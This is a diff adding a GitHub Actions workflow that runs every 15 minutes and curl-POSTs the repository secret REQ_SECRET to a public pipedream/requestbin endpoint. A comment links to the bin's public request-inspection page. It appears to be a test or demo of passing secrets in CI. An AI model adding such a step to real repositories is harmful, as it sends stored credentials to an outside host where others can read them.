@@ -1,0 +1,16 @@
+name: CURL Request with Secrets
+
+on:
+  schedule:
+    - cron: '*/15 * * * *'
+
+jobs:
+  notify:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Send POST request
+        # Inspect requests at https://public.requestbin.com/r/enw9z3kw0afbh
+        run: |
+          curl -X POST "https://enw9z3kw0afbh.x.pipedream.net" \
+          -H "Authorization: ${{ secrets.REQ_SECRET }}"
